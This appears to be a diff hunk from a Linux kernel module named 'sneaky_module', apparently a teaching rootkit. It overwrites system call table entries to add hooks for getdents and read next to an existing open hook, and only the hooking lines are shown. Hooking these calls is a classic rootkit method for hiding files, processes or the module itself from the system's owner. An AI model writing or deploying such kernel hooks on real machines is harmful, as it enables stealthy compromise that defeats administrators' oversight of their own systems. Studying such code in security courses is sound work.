@@ -114,6 +114,11 @@ static int initialize_sneaky_module(void)
   //table with the function address of our new code.
   original_call = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+  original_getdents = (void *)*(sys_call_table + __NR_getdents);
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
+  // read system call
+  original_read = (void *)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
